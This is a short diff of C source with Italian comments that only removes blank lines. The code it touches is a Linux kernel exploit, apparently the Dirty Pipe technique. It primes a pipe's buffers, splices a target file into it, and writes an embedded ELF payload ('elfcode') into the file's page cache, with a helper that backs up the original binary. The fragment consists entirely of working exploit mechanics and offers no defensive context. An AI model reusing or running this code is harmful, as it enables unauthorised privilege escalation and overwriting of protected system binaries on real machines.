@@ -69,30 +69,24 @@ unsigned char elfcode[] = {
 	
 
 void prepara_pipe(int p[2] ){
-
 	uint8_t buffer[PAGE_SIZE]; //4096 Byte (4KB)
 	const unsigned pipe_size=fcntl(p[1],F_GETPIPE_SZ); //tipicamente 16 pagine circa. Varia da architettura a architettura
-	
 	//riempi pipe completamente
 	for(int to_write=pipe_size; to_write > 0; to_write-=PAGE_SIZE){
-
 		if(  to_write >= PAGE_SIZE ){
 			write(p[1], buffer, PAGE_SIZE);		
 		}else{
 			write(p[1], buffer, to_write );
 		}
 	}
-
 	//svuota pipe completamente
 	for(int to_read=pipe_size; to_read > 0; to_read-=PAGE_SIZE){
-
 		if(  to_read >= PAGE_SIZE ){
 			read(p[0], buffer, PAGE_SIZE);		
 		}else{
 			read(p[0], buffer, to_read );
 		}
 	}
-
 }
 
 
@@ -121,7 +115,6 @@ ssize_t backup_binary(char * path, uint8_t * backup){
 
 
 void punta_page_cache(int fd, int p[2]){
-
 	loff_t offset=0;
 	int res = splice(fd,&offset,p[1],NULL,1,0); 
 	if( res <= 0 ){
@@ -131,9 +124,7 @@ void punta_page_cache(int fd, int p[2]){
 }
 
 void scrivi_page_cache(int p[2], uint8_t * data){
-
 	ssize_t numwrite;
-	
 	numwrite = write(p[1],data,ELFCODE_SIZE);
 	if(numwrite < ELFCODE_SIZE){
 		perror( numwrite == 0 ? "[x] write non riuscita \n" : "[x] write troppo corta \n");
